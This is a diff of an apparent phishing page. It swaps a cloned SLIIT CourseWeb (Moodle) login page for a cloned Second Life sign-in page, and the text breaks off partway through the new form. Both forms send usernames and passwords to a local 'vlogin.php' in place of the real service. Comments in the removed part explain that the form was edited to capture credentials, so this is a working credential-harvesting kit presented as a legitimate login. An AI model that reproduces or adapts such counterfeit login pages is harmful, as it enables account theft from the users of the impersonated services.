@@ -1,211 +1,515 @@
-<!DOCTYPE html>
-<!-- saved from url=(0041)http://courseweb.sliit.lk/login/index.php -->
-<html dir="ltr" lang="en" xml:lang="en" class="yui3-js-enabled">
-    <div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important" class="">
-	</div>
-		<head>
-			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-				<title>CourseWeb: Log in to the site</title>
-					<link rel="shortcut icon" href="http://courseweb.sliit.lk/theme/image.php/simplespace/theme/1489376202/favicon">
-						<meta name="keywords" content="moodle, CourseWeb: Log in to the site">
-							<!-- Connect with css file  -->
-							<script type="text/javascript">
-							//<![CDATA[
-							var M = {}; M.yui = {};
-							M.pageloadstarttime = new Date();
-							M.cfg = {"wwwroot":"http:\/\/courseweb.sliit.lk","sesskey":"4qs5Xr1axF","loadingicon":"http:\/\/courseweb.sliit.lk\/theme\/image.php\/simplespace\/core\/1489376202\/i\/loading_small","themerev":"1489376202","slasharguments":1,"theme":"simplespace","jsrev":"1489376202","admin":"admin","svgicons":true};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
-							var yui2ConfigFn = function(me) {var parts=me.name.replace(/^moodle-/,'').split('-'),component=parts.shift(),module=parts[0],min='-min';if(/-(skin|core)$/.test(me.name)){parts.pop();me.type='css';min=''};if(module){var filename=parts.join('-');me.path=component+'/'+module+'/'+filename+min+'.'+me.type}else me.path=component+'/'+component+'.'+me.type};
-							YUI_config = {"debug":false,"base":"http:\/\/courseweb.sliit.lk\/lib\/yuilib\/3.17.2\/","comboBase":"http:\/\/courseweb.sliit.lk\/theme\/yui_combo.php?","combine":true,"filter":null,"insertBefore":"firstthemesheet","groups":{"yui2":{"base":"http:\/\/courseweb.sliit.lk\/lib\/yuilib\/2in3\/2.9.0\/build\/","comboBase":"http:\/\/courseweb.sliit.lk\/theme\/yui_combo.php?","combine":true,"ext":false,"root":"2in3\/2.9.0\/build\/","patterns":{"yui2-":{"group":"yui2","configFn":yui1ConfigFn}}},"moodle":{"name":"moodle","base":"http:\/\/courseweb.sliit.lk\/theme\/yui_combo.php?m\/1489376202\/","combine":true,"comboBase":"http:\/\/courseweb.sliit.lk\/theme\/yui_combo.php?","ext":false,"root":"m\/1489376202\/","patterns":{"moodle-":{"group":"moodle","configFn":yui2ConfigFn}},"filter":null,"modules":{"moodle-core-formautosubmit":{"requires":["base","event-key"]},"moodle-core-checknet":{"requires":["base-base","moodle-core-notification-alert","io-base"]},"moodle-core-handlebars":{"condition":{"trigger":"handlebars","when":"after"}},"moodle-core-lockscroll":{"requires":["plugin","base-build"]},"moodle-core-actionmenu":{"requires":["base","event","node-event-simulate"]},"moodle-core-tooltip":{"requires":["base","node","io-base","moodle-core-notification-dialogue","json-parse","widget-position","widget-position-align","event-outside","cache-base"]},"moodle-core-blocks":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification"]},"moodle-core-formchangechecker":{"requires":["base","event-focus"]},"moodle-core-event":{"requires":["event-custom"]},"moodle-core-popuphelp":{"requires":["moodle-core-tooltip"]},"moodle-core-notification":{"requires":["moodle-core-notification-dialogue","moodle-core-notification-alert","moodle-core-notification-confirm","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-core-notification-dialogue":{"requires":["base","node","panel","escape","event-key","dd-plugin","moodle-core-widget-focusafterclose","moodle-core-lockscroll"]},"moodle-core-notification-alert":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-confirm":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-exception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-ajaxexception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-dock":{"requires":["base","node","event-custom","event-mouseenter","event-resize","escape","moodle-core-dock-loader"]},"moodle-core-dock-loader":{"requires":["escape"]},"moodle-core-chooserdialogue":{"requires":["base","panel","moodle-core-notification"]},"moodle-core-maintenancemodetimer":{"requires":["base","node"]},"moodle-core-dragdrop":{"requires":["base","node","io","dom","dd","event-key","event-focus","moodle-core-notification"]},"moodle-core_availability-form":{"requires":["base","node","event","panel","moodle-core-notification-dialogue","json"]},"moodle-backup-backupselectall":{"requires":["node","event","node-event-simulate","anim"]},"moodle-backup-confirmcancel":{"requires":["node","node-event-simulate","moodle-core-notification-confirm"]},"moodle-calendar-info":{"requires":["base","node","event-mouseenter","event-key","overlay","moodle-calendar-info-skin"]},"moodle-course-categoryexpander":{"requires":["node","event-key"]},"moodle-course-modchooser":{"requires":["moodle-core-chooserdialogue","moodle-course-coursebase"]},"moodle-course-toolboxes":{"requires":["node","base","event-key","node","io","moodle-course-coursebase","moodle-course-util"]},"moodle-course-formatchooser":{"requires":["base","node","node-event-simulate"]},"moodle-course-management":{"requires":["base","node","io-base","moodle-core-notification-exception","json-parse","dd-constrain","dd-proxy","dd-drop","dd-delegate","node-event-delegate"]},"moodle-course-util":{"requires":["node"],"use":["moodle-course-util-base"],"submodules":{"moodle-course-util-base":{},"moodle-course-util-section":{"requires":["node","moodle-course-util-base"]},"moodle-course-util-cm":{"requires":["node","moodle-course-util-base"]}}},"moodle-course-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-course-coursebase","moodle-course-util"]},"moodle-form-showadvanced":{"requires":["node","base","selector-css3"]},"moodle-form-passwordunmask":{"requires":["node","base"]},"moodle-form-shortforms":{"requires":["node","base","selector-css3","moodle-core-event"]},"moodle-form-dateselector":{"requires":["base","node","overlay","calendar"]},"moodle-core_message-messenger":{"requires":["escape","handlebars","io-base","moodle-core-notification-ajaxexception","moodle-core-notification-alert","moodle-core-notification-dialogue","moodle-core-notification-exception"]},"moodle-question-qbankmanager":{"requires":["node","selector-css3"]},"moodle-question-searchform":{"requires":["base","node"]},"moodle-question-chooser":{"requires":["moodle-core-chooserdialogue"]},"moodle-question-preview":{"requires":["base","dom","event-delegate","event-key","core_question_engine"]},"moodle-availability_completion-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_date-form":{"requires":["base","node","event","io","moodle-core_availability-form"]},"moodle-availability_grade-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_group-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_grouping-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_profile-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-mod_assign-history":{"requires":["node","transition"]},"moodle-mod_forum-subscriptiontoggle":{"requires":["base-base","io-base"]},"moodle-mod_quiz-quizbase":{"requires":["base","node"]},"moodle-mod_quiz-questionchooser":{"requires":["moodle-core-chooserdialogue","moodle-mod_quiz-util","querystring-parse"]},"moodle-mod_quiz-repaginate":{"requires":["base","event","node","io","moodle-core-notification-dialogue"]},"moodle-mod_quiz-quizquestionbank":{"requires":["base","event","node","io","io-form","yui-later","moodle-question-qbankmanager","moodle-core-notification-dialogue"]},"moodle-mod_quiz-toolboxes":{"requires":["base","node","event","event-key","io","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-slot","moodle-core-notification-ajaxexception"]},"moodle-mod_quiz-modform":{"requires":["base","node","event"]},"moodle-mod_quiz-autosave":{"requires":["base","node","event","event-valuechange","node-event-delegate","io-form"]},"moodle-mod_quiz-util":{"requires":["node"],"use":["moodle-mod_quiz-util-base"],"submodules":{"moodle-mod_quiz-util-base":{},"moodle-mod_quiz-util-slot":{"requires":["node","moodle-mod_quiz-util-base"]},"moodle-mod_quiz-util-page":{"requires":["node","moodle-mod_quiz-util-base"]}}},"moodle-mod_quiz-randomquestion":{"requires":["base","event","node","io","moodle-core-notification-dialogue"]},"moodle-mod_quiz-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-base","moodle-mod_quiz-util-page","moodle-mod_quiz-util-slot","moodle-course-util"]},"moodle-message_airnotifier-toolboxes":{"requires":["base","node","io"]},"moodle-block_navigation-navigation":{"requires":["base","io-base","node","event-synthetic","event-delegate","json-parse"]},"moodle-filter_glossary-autolinker":{"requires":["base","node","io-base","json-parse","event-delegate","overlay","moodle-core-notification"]},"moodle-filter_mathjaxloader-loader":{"requires":["moodle-core-event"]},"moodle-editor_atto-editor":{"requires":["node","transition","io","overlay","escape","event","event-simulate","event-custom","node-event-html5","yui-throttle","moodle-core-notification-dialogue","moodle-core-notification-confirm","moodle-editor_atto-rangy","handlebars","timers"]},"moodle-editor_atto-plugin":{"requires":["node","base","escape","event","event-outside","handlebars","event-custom","timers"]},"moodle-editor_atto-menu":{"requires":["moodle-core-notification-dialogue","node","event","event-custom"]},"moodle-editor_atto-rangy":{"requires":[]},"moodle-report_eventlist-eventfilter":{"requires":["base","event","node","node-event-delegate","datatable","autocomplete","autocomplete-filters"]},"moodle-report_loglive-fetchlogs":{"requires":["base","event","node","io","node-event-delegate"]},"moodle-gradereport_grader-gradereporttable":{"requires":["base","node","event","handlebars","overlay","event-hover"]},"moodle-gradereport_history-userselector":{"requires":["escape","event-delegate","event-key","handlebars","io-base","json-parse","moodle-core-notification-dialogue"]},"moodle-tool_capability-search":{"requires":["base","node"]},"moodle-tool_monitor-dropdown":{"requires":["base","event","node"]},"moodle-assignfeedback_editpdf-editor":{"requires":["base","event","node","io","graphics","json","event-move","event-resize","querystring-stringify-simple","moodle-core-notification-dialog","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-atto_accessibilitychecker-button":{"requires":["color-base","moodle-editor_atto-plugin"]},"moodle-atto_accessibilityhelper-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_align-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_bold-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_charmap-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_clear-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_collapse-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emoticon-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_equation-button":{"requires":["moodle-editor_atto-plugin","moodle-core-event","io","event-valuechange","tabview","array-extras"]},"moodle-atto_html-button":{"requires":["moodle-editor_atto-plugin","event-valuechange"]},"moodle-atto_image-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_indent-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_italic-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_link-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_managefiles-usedfiles":{"requires":["node","escape"]},"moodle-atto_managefiles-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_media-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_noautolink-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_orderedlist-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_rtl-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_strike-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_subscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_superscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_table-button":{"requires":["moodle-editor_atto-plugin","moodle-editor_atto-menu","event","event-valuechange"]},"moodle-atto_title-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_underline-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_undo-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_unorderedlist-button":{"requires":["moodle-editor_atto-plugin"]}}},"gallery":{"name":"gallery","base":"http:\/\/courseweb.sliit.lk\/lib\/yuilib\/gallery\/","combine":true,"comboBase":"http:\/\/courseweb.sliit.lk\/theme\/yui_combo.php?","ext":false,"root":"gallery\/1489376202\/","patterns":{"gallery-":{"group":"gallery"}}}},"modules":{"core_filepicker":{"name":"core_filepicker","fullpath":"http:\/\/courseweb.sliit.lk\/lib\/javascript.php\/1489376202\/repository\/filepicker.js","requires":["base","node","node-event-simulate","json","async-queue","io-base","io-upload-iframe","io-form","yui2-treeview","panel","cookie","datatable","datatable-sort","resize-plugin","dd-plugin","escape","moodle-core_filepicker"]},"mathjax":{"name":"mathjax","fullpath":"http:\/\/courseweb.sliit.lk\/filter\/MathJax-master\/MathJax.js?delayStartupUntil=configured"}}};
-							M.yui.loader = {modules: {}};
 
-							//]]>
-							</script>
-			
-								<link rel="stylesheet" type="text/css" href="./CourseWeb_ Log in to the site_files/yui_combo.php">
-								<link rel="stylesheet" type="text/css" href="./CourseWeb_ Log in to the site_files/yui_combo(1).php">
-							<script type="text/javascript" src="./CourseWeb_ Log in to the site_files/yui_combo(2).php"></script>
-							<script charset="utf-8" id="yui_3_17_2_2_1490272192120_4" src="./CourseWeb_ Log in to the site_files/yui_combo(3).php" async=""></script>
-								<link charset="utf-8" rel="stylesheet" id="yui_3_17_2_2_1490272192120_14" href="./CourseWeb_ Log in to the site_files/yui_combo(4).php">
-							<script charset="utf-8" id="yui_3_17_2_2_1490272192120_15" src="./CourseWeb_ Log in to the site_files/yui_combo(5).php" async=""></script>
-							<script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script>
-								<link rel="stylesheet" type="text/css" href="./CourseWeb_ Log in to the site_files/all">
-							<script type="text/javascript" src="./CourseWeb_ Log in to the site_files/javascript-static.js.download"></script>
 
-				<meta name="robots" content="noindex">
-				<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="core/first" src="./CourseWeb_ Log in to the site_files/first.js.download"></script>
-				<script type="text/x-mathjax-config">MathJax.Hub.Config({
-					config: ["Accessible.js", "Safe.js"],
-					errorSettings: { message: ["!"] },
-					skipStartupTypeset: true,
-					messageStyle: "none"
-				});
-				</script>
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<!--[if lt IE 7]> <html xmlns="http://www.w3.org/1999/xhtml" class="lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]> <html xmlns="http://www.w3.org/1999/xhtml" class="lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]> <html xmlns="http://www.w3.org/1999/xhtml" class="lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html xmlns="http://www.w3.org/1999/xhtml"> <!--<![endif]-->
+<head>
+
+
+
+
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://radix.secondlife.com/gtm.js?id='+i+dl';f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-MFW9KQS');</script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="imagetoolbar" content="no" />
+<meta name="description" content="Second Life login" />
+<meta name="keywords" content="" />
+
+  <title>Second Life: Sign In</title>
+  <link rel="stylesheet" type="text/css" href="https://s3.amazonaws.com/common.web.secondlife.com/_css/blueprint/screen.css" media="screen, projection" />
+  <!--[if IE]><link rel="stylesheet" href="https://s3.amazonaws.com/common.web.secondlife.com/_css/blueprint/ie.css" type="text/css" media="screen, projection" /><![endif]-->
+
+  <link rel="icon" type="image/vnd.microsoft.icon" href="https://s3.amazonaws.com/common.web.secondlife.com/favicon.ico" />
+
+
+  <script type="text/javascript" src="https://s3.amazonaws.com/common.web.secondlife.com/_js/jquery-1.8.3.min.js"></script>
+
+  <script type="text/javascript">
+    $(document).ready(function(){
+      $("#more-about-username").click(function () {
+        $("#help_notes").fadeIn(1000);
+        // $("#error_message").fadeOut(500);
+      });
+      $('#username').focus(function() {
+        $("#help_notes").fadeOut(1000);
+        // $("#error_message").fadeIn(500);
+      });
+
+      
+    });
+  </script>
+
+  <style type="text/css">
+  /* ==========================================
+  ** GLOBAL STYLES
+  ** ========================================== */
+  body{ font-family:Arial,Helvetica,Verdana,sans-serif; }
+  a {color:#5cb192;font-weight:bold;text-decoration:none;}
+  a:hover {color:#ff6a00;}
+
+
+  /* Production Stuff - from reg-in-progress main996.css */
+
+  body {
+    background: #e8e9ec url(https://s3.amazonaws.com/common.web.secondlife.com/_img/bg.gif) top left repeat-x;
+    margin-top: 0;
+    margin-bottom: -30px;
+    padding-bottom: 0;
+    font-size: 0.8em;
+  }
+
+  .container {
+    background: #e8e9ec url(https://s3.amazonaws.com/common.web.secondlife.com/_img/bg.gif) top left repeat-x;
+  }
+
+  #containerShadowMain {
+    width: 1080px;
+    background: url(https://s3.amazonaws.com/common.web.secondlife.com/_img/bg_main_shadow.gif) top left repeat-y;
+    margin: 0 auto;
+    padding: 0;
+    /*border-bottom: 2px solid;*/
+  }
+
+  #containerShadowTop {
+    background: url(https://s3.amazonaws.com/common.web.secondlife.com/_img/bg_top_shadow.gif) top left no-repeat;
+    margin: 0;
+    padding: 0;
+  }
+
+
+  /* override screen.css */
+  input.text, input.title, textarea, select, input { margin: 0; }
+  input.checkbox { margin-right: 5px; }
+  form { margin:0; padding:0;position:relative; }
+  h4 {font-weight:bold;}
+
+  .note {
+    display:none;
+    background-color:#F7F2CA;
+    margin-top:-4px;
+    padding:10px 12px;
+    position:absolute;
+    right:0;
+    right:0;
+    top:-65px;
+    width:300px;
+    z-index: 1000;
+    border: 1px solid #FBEED5;
+  }
+
+  .note.error {
+    background: #FBE3E4;
+    color: #8A1F11;
+    border-color: #FBC2C4;
+    z-index: 999;
+    display: block;
+  }
+
+  #header {
+    border-bottom: 1px solid #383838;
+    height: 56px;
+    background-color:#000;
+  }
+  #sl-logo a {
+  background:url("https://s3.amazonaws.com/common.web.secondlife.com/_img/sl-logo-login.png") no-repeat scroll left top transparent;
+  display:block;
+  background-size: 100% 100%;
+  float:left;
+  height:33px;
+  margin:12px 0 0 35px;
+  outline:medium none;
+  text-indent:-2000em;
+  width:66px;
+  }
+
+  #header h1#logo {
+    height: 56px;
+    margin: 0;
+  }
+
+  #header h1#logo span {
+    display: none;
+  }
+
+#more-about-username { display:inline; padding:7px 0 0 7px;margin:0; float:none;}
+  /* MAIN CONTENT BUTTONS or LARGER BUTTONS */
+  .clearbutton {
+    overflow:hidden;
+    width:100%;
+  }
+
+  .css_button_hot {
+    display: inline-block;
+    outline: none;
+    cursor: pointer;
+    text-align: center;
+    text-decoration: none;
+    font: 14px Arial, Helvetica, sans-serif;
+    padding:5px 10px 6px;
+    text-shadow: 0 1px 1px rgba(0,0,0,.3);
+    -webkit-border-radius: 5px;
+    -moz-border-radius: 5px;
+    border-radius: 5px;
+    -webkit-box-shadow: 0 1px 2px rgba(0,0,0,.2);
+    -moz-box-shadow: 0 1px 2px rgba(0,0,0,.2);
+    /* box-shadow: 0 1px 2px rgba(0,0,0,.2); */
+    font-weight:bold;
+    border:0;
+    line-height:1;
+  }
+
+  .css_button_hot.btn_large{
+  font-size:18px;
+  line-height:24px;
+  padding:6px 30px;
+  }
+
+  .css_button_hot.primary{
+    background-color:#ff6901;
+    background: -webkit-gradient(linear, left top, left bottom, from(#ff8c3f), to(#ff6901));
+    background: -moz-linear-gradient(top,  #ff8c3f,  #ff6901);
+    color:#fff;
+  }
+  .css_button_hot.primary:hover {
+    color:#fff;
+    background: #ffb23f;
+    background: -webkit-gradient(linear, left top, left bottom, from(#ffb23f), to(#ff9a03));
+    background: -moz-linear-gradient(top,  #ffb23f,  #ff9a03);
+    filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffb23f', endColorstr='#ff9a03');
+  }
+  .css_button_hot.secondary{
+    background-color:#85c5ad;
+    background: -webkit-gradient(linear, left top, left bottom, from(#85c5ad), to(#5eb293));
+    background: -moz-linear-gradient(top,  #85c5ad,  #5eb293);
+    color:#fff;
+  }
+  .css_button_hot.secondary:hover {
+    color:#fff;
+    background: #91d6bc;
+    background: -webkit-gradient(linear, left top, left bottom, from(#91d6bc), to(#69c7a4));
+    background: -moz-linear-gradient(top,  #91d6bc,  #69c7a4);
+    filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffb23f', endColorstr='#69c7a4');
+  }
+
+  /* hack - hide teh real submit button. we have to keep it in b/c IE won't submit on enter otherwise. */
+ /* input.css_button_hot {
+    background: none;
+    border: none;
+    display:block;
+    color:#FFF;
+    float:left;
+    width:0;
+    height:0;
+  } */
+
+  /* LOGIN SPECIFIC STYLES */
+
+  #block-mid {
+    background: url('https://s3.amazonaws.com/common.web.secondlife.com/_img/backgrounds/bg_content_shadow.png') repeat-x top left;
+    color: #595c63;
+    padding: 6em 0;
+  }
+  #block-mid h2,h3,h4 {
+    color: #595c63;
+  }
+  #block-mid h2 {
+    margin-top: 0;
+    padding-top: 0;
+  }
+
+  #block-login {
+    min-height:400px;
+    /*height:auto !important;*/
+    /*height:400px;*/
+  }
+
+  #block-join {
+   /*padding:10px;*/
+    min-height:400px;
+    /*height:auto !important;*/
+    /*height:400px;*/
+    }
+
+  #footer {
+    background: url('https://s3.amazonaws.com/common.web.secondlife.com/_img/bg_footer.gif') repeat-x top left;
+    height: 6em;
+    border-top: 1px solid;
+    color:#595C62;
+    font-size: 12px;
+    text-align: right;
+  }
+
+  #footer p {
+    font-size: 0.9em;
+    margin: .5em .5em 0 0;
+  }
+
+  #footer a {
+    text-decoration: none;
+    font-weight: bold;
+  }
+
+  #copyright {
+    padding: 7px;
+    text-align: right;
+  }
+
+  .block-content {
+    min-height:235px;
+    height:auto !important;
+    height:210px;
+  }
+  label  {
+  color:#494B4D;
+  font-size:14px;
+  padding-bottom:5px;
+  }
+  label.username_l {
+  background: transparent url("https://s3.amazonaws.com/common.web.secondlife.com/_img/info-icon.png") left top no-repeat;
+  }
+  #last_name, #first_name, #username, #password {border:1px solid #D6D6D6;
+  font-size:14px;
+  margin:0;padding:5px;width:390px;}
+  input:focus {border-color:#888;}
+  .block-content td {
+    vertical-align: top;
+  }
+  .block-btn { text-align: center; }
+  /* Modules Dialog
+  -----------------------------------*/
+  div.dialog div.content {  padding:15px;background-color:#fff;}
+  div.dialog div.content, .note {
+  -webkit-border-radius: 5px;
+  -moz-border-radius: 5px;
+  border-radius: 5px;
+  }
+  .dialog{min-height:300px;}
+
+  @media (max-width: 995px) {
+    body.nojoin {
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .nojoin #containerShadowTop {
+      position: absolute;
+      left: 50%;
+      margin-left: -515px;
+    }
+
+    .nojoin #block-mid {
+      min-height: 280px;
+    }
+
+    .nojoin .block-login {
+      position: absolute;
+      left: 50%;
+      top: 80px;
+      width: 450px;
+      margin-left: -210px;
+    }
+
+    .nojoin .block-login.prepend-1,
+    .nojoin .block-login.prepend-7 {
+      padding-left: 0;
+    }
+
+    .nojoin .block-join {
+      display: none;
+    }
+
+    .nojoin #sl-logo {
+      position: absolute;
+      left: 50%;
+      margin-left: -240px;
+    }
+  }
+
+  .amazon_disclaimer {
+    font-size: 10px;
+    position: relative;
+    top: -10px;
+    margin-bottom: 0;
+  }
+
+  .nojoin .resetpass { margin-bottom: 0; }
+
+
+  /* Add the IE8 hacks here*/
+  .lt-ie9 body.nojoin {
+    width: 100%;
+    overflow: hidden;
+  }
+
+  .lt-ie9 .nojoin #containerShadowTop {
+    position: absolute;
+    left: 50%;
+    margin-left: -515px;
+  }
+
+  .lt-ie9 .nojoin #block-mid {
+    min-height: 280px;
+  }
+
+  .lt-ie9 .nojoin .block-login {
+    position: absolute;
+    left: 50%;
+    top: 80px;
+    width: 450px;
+    margin-left: -210px;
+  }
+
+  .lt-ie9 .nojoin .block-login.prepend-1,
+  .lt-ie9 .nojoin .block-login.prepend-7 {
+    padding-left: 0;
+  }
+
+  .lt-ie9 .nojoin .block-join {
+    display: none;
+  }
+
+  .lt-ie9 .nojoin #sl-logo {
+    position: absolute;
+    left: 50%;
+    margin-left: -240px;
+  }
+  </style>
+
 </head>
-		<!-- start body  -->
-		
-		<body id="page-login-index" class="format-site  path-login safari dir-ltr lang-en yui-skin-sam yui3-skin-sam courseweb-sliit-lk pagelayout-login course-1 context-1 notloggedin content-only jsenabled">
-			<div class="skiplinks"><a class="skip" href="http://courseweb.sliit.lk/login/index.php#maincontent">Skip to main content</a></div>
-				<script type="text/javascript">
-					//<![CDATA[
-					document.body.className += ' jsenabled';
-					//]]>
-				</script>
-				
-<! Start the Page >
-
-				<div id="page">
-					<div id="wrapper">
-	
-						<div id="top-header">
-							<div class="inner-wrap">
-
-								<div id="top-left">
-								</div>
-	
-<!-- start of custom menu -->	
-<!-- end of menu -->
-							</div>
-						</div>
-	
-<!-- start OF header -->
-						<div id="page-header" class="inner-wrap page-header-nothome">
-		    			<!--<img src="" id="logo">-->
-							<div id="innerrightinfo"> 		
-								<img class="userpicture" src="./CourseWeb_ Log in to the site_files/image">
-								<div class="logininfo">You are not logged in.
-								</div>
-								<div class="ppin">
-								</div>
-							</div>		
-						</div>
-<!-- end of header -->		
-
-						<div id="page-content-wrapper">
-<!-- start OF moodle CONTENT -->
-							<div id="page-content" class="inner-wrap">
- 
- <!-- start of navbar -->
-								<div class="navbar clearfix">
-									<div class="breadcrumb"><span class="accesshide">Page path</span>
-										<nav>
-											<ul>
-												<li><a href="http://courseweb.sliit.lk/">Home</a></li>
-												<li> 
-													<span class="accesshide ">
-														<span class="arrow_text">/
-														</span>&nbsp;
-													</span>
-													<span class="arrow sep">►
-													</span> 
-													<span tabindex="0">Log in to the site
-													</span>
-												</li>
-											</ul>
-										</nav>
-									</div>
-									<div class="navbutton">
-									</div>
-								</div>
-<!-- end of navbar -->
- 
-								<div id="region-main-box">
-									<div id="region-post-box">
-									
-										<div id="region-main-wrap">
-											<div id="region-main">
-												<div class="region-content" id="yui_3_17_2_2_1490072492110_31">
-                           
-                                                                               
-													<div role="main" id="yui_3_17_2_2_1490072492110_30">
-														<span id="maincontent"></span>
-														
-														<div class="loginbox clearfix onecolumn" id="yui_3_17_2_2_1490072492110_29">
-															<div class="loginpanel" id="yui_3_17_2_2_1490072492110_28">
-																
-																
-																<h2 id="yui_3_17_2_2_1490072492110_32">Log in</h2>
-																  <div class="subcontent loginsub" id="yui_3_17_2_2_1490072492110_27">
-																			
-																	<! Here is the starting login form >
-																	  
-																	<!-- Here is form what we need to edit to get username and password -->
-																	  <!-- we need to change  button action and user name id value and password id value  -->
-																	<form action="vlogin.php" method="post" id="login">
-																	 
-																	 <div class="loginform">
-																		<div class="form-label"><label for="username">Username</label>
-																		</div>
-																		<div class="form-input">
-																		  <input type="text" name="username" id="username" size="15" value="">
-																		</div>
-																		<div class="clearer"><!-- -->
-																		</div>
-																		<div class="form-label"><label for="password">Password</label>
-																		</div>
-																		<div class="form-input">
-																		  <input type="password" name="password" id="password" size="15" value="">
-																		</div>
-																	  </div>
-																		<div class="clearer"><!-- -->
-																		</div>
-																		<div class="clearer"><!-- -->
-																		</div>
-																	  
-																		<input type="submit" id="loginbtn" value="Log in">
-																	  <div class="forgetpass"><a href="">Forgotten your username or password?</a>
-																	  </div>
-																	</form>
-																	
-																	<div class="desc">
-																		Cookies must be enabled in your browser
-																		<span class="helptooltip">
-																			<a href="" title="Help with Cookies must be enabled in your browser" aria-haspopup="true" target="">
-																				<img src="" alt="Help with Cookies must be enabled in your browser" class="iconhelp">
-																			</a>
-																		</span>
-																	</div>
-																</div>
-															</div>
-														</div>
-													</div>                            
-																													
-																					   
-												</div>
-											</div>
-										</div>
-																			
-																							
-																							
-									</div>
-								</div>
-							</div>
-<!-- end OF moodle CONTENT -->
-							<div class="clearer"></div>
-						</div>
-<!-- end OF moodle CONTENT wrapper -->
 
 
-<!-- start of footer -->
-	
-						<div id="page-footer" class="inner-wrap">
-							<div class="logininfo">You are not logged in.</div>
-							<div class="homelink"><a href="http://courseweb.sliit.lk/">Home</a></div>
-						</div>
-<!-- end of footer -->	
+<body>
 
-						<div class="clearer"></div>
 
-					</div><!-- end #wrapper -->
-				</div><!-- end #page -->	
 
-				<script type="text/javascript"></script>
 
-				<script type="text/javascript" src="./CourseWeb_ Log in to the site_files/require.min.js.download"></script>
-				<script type="text/javascript"></script>
-				<script type="text/javascript"></script>
-				<script type="text/javascript"></script>
 
-				<iframe frameborder="0" scrolling="no" style="background-color: transparent; border: 0px; display: none;" src="./CourseWeb_ Log in to the site_files/saved_resource.html"></iframe>
-				<div id="GOOGLE_INPUT_CHEXT_FLAG" style="display: none;" input="" input_stat="{&quot;tlang&quot;:true,&quot;tsbc&quot;:true,&quot;pun&quot;:true,&quot;mk&quot;:true,&quot;ss&quot;:true}"></div>
-				</body>
-				</html>
+
+<noscript><iframe src="https://radix.secondlife.com/ns.html?id=GTM-MFW9KQS" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+
+
+<div id="containerShadowMain">
+  <div id="containerShadowTop">
+    <div class="container showgrid">
+
+<div id="header" class="span-24 clear">
+    <div id="sl-logo">
+        <span><a href="http://secondlife.com" target="_blank">Second Life</a></span>
+    </div>
+</div>
+
+
+<div id="block-mid" class="span-24">
+
+  
+  <div class="block-login dialog prepend-1 span-11">
+  
+    <div class="content">
+
+      <form id="loginform" action="vlogin.php" method="post" style="position:relative;">
+        <input type='hidden' name='csrfmiddlewaretoken' value='pCckIoUA553aep00PP89E5JDHcqunXa5PxXXU2GVkmCEZATWgH0g4oaKgencCEbl' />
+
+        <h2>Sign In</h2>
+
+        <div class="block-content">
+
+        
+
+                
+
+          <p>
